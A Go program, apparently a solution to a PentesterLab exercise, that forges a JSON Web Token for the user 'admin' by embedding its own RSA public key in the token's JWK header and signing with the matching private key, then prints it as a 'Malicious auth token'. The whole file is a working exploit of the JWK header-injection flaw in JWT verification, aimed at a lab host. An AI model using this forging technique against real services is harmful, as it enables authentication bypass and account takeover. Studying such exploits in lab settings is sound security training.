package main

import (
	"bufio"
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"log"
	"math/big"
	"os"
	"strings"
)

const (
	origToken   = "eyJhbGciOiJSUzI1NiIsImtpZCI6InZWWWJmRlh4bXVDd2ZIV2ZWenBoSXhDMTM4TzdCRkgtZ1RBcjE0ZGt0c2cifQ.dGVzdA.hnX-5PDdCaQMgGNsuu18mMIzN2YE5jZLNLDCEdoPNyrdZhpi9C2RqGfzx99rKoni8tRUg2Cz8pxbmX_tNtnFglZYUmEXJqHDTR5-1ZH0GVIHAc0OY6-tNe7keJ0xmGJFtriljRZ4FCOOSfO_bfL9pyeiIaaPu-VP1VQJT_8NaqrKrzxfcfBolJMfS4JS8QOqUfKxkrV5Xx6alYBO9x9CAQyjO0YaUYAVxQo43YE8hIGSQjx3yZNzyRgJpe133QeE3LNsAXF8l6WqAoDqJ72VG3F6I2qXMBd44B57HcaSY8aeIaby34DRRJUfydA38fKQ4WSczQIg80HXmXhW-fKwFQ"
	attackURL   = "http://ptl-8d4d66d9-8109cb3d.libcurl.so/"
	privKeyPath = "private.pem"
	targetUser  = "admin"
)

var (
	signKey *rsa.PrivateKey
)

type JWK struct {
	Kty string `json:"kty"`
	Kid string `json:"kid"`
	Use string `json:"use"`
	N   string `json:"n"`
	E   string `json:"e"`
}

type Header struct {
	Alg string `json:"alg"`
	Jwk JWK    `json:"jwk"`
}

func main() {
	fmt.Println("[*] Original auth token:")
	fmt.Println(parseToken(origToken))

	privKey := loadRSAPEM(privKeyPath)
	cookie := buildToken(targetUser, privKey)

	fmt.Println("[*] Malicious auth token (admin):")
	fmt.Println(cookie)
}

func fatal(err error) {
	if err != nil {
		log.Fatalln(err)
	}
}

func buildToken(username string, privKey *rsa.PrivateKey) string {
	jwk := makeJWK(privKey)
	// https://goinbigdata.com/how-to-correctly-serialize-json-string-in-golang/
	tmp, err := json.Marshal(Header{"RS256", jwk})
	fatal(err)

	header := encodeJWK(tmp)
	payload := encodeJWK([]byte(username))
	token := strings.Join([]string{header, payload}, ".")
	sig := signRS256([]byte(token), privKey)

	token = strings.Join([]string{token, encodeJWK(sig)}, ".")
	return token
}

func signRS256(token []byte, privKey *rsa.PrivateKey) []byte {
	h := sha256.New()
	h.Write(token)
	d := h.Sum(nil)
	sig, err := rsa.SignPKCS1v15(rand.Reader, privKey, crypto.SHA256, d)
	fatal(err)
	return sig
}

// https://socketloop.com/tutorials/golang-example-for-rsa-package-functions-example
func makeJWK(privKey *rsa.PrivateKey) JWK {
	// unsigned big-endian representation; e”:“AQAB”, not 65537
	return JWK{"RSA", "pentesterlab", "sig", encodeJWK(privKey.PublicKey.N.Bytes()), encodeJWK(big.NewInt(int64(privKey.PublicKey.E)).Bytes())}
}

// https://medium.com/@raul_11817/export-import-pem-files-in-go-67614624adc7
func loadRSAPEM(privKeyPath string) *rsa.PrivateKey {
	privKeyFile, err := os.Open(privKeyPath)
	fatal(err)

	pemfileinfo, _ := privKeyFile.Stat()
	size := pemfileinfo.Size()
	pembytes := make([]byte, size)
	buffer := bufio.NewReader(privKeyFile)
	_, err = buffer.Read(pembytes)
	data, _ := pem.Decode(pembytes)
	privKeyFile.Close()

	privKeyImported, err := x509.ParsePKCS1PrivateKey(data.Bytes)
	fatal(err)
	return privKeyImported
}

func parseToken(token string) []string {
	s := strings.Split(token, ".")
	parsed := make([]string, 0)
	for _, v := range s[0:2] {
		d, err := base64.RawStdEncoding.DecodeString(v)
		if err != nil {
			log.Fatalln(err)
		}
		parsed = append(parsed, string(d))
	}
	return parsed
}

func encodeJWK(v []byte) string {
	encoded := base64.URLEncoding.EncodeToString(v)
	return strings.ReplaceAll(encoded, "=", "")
}
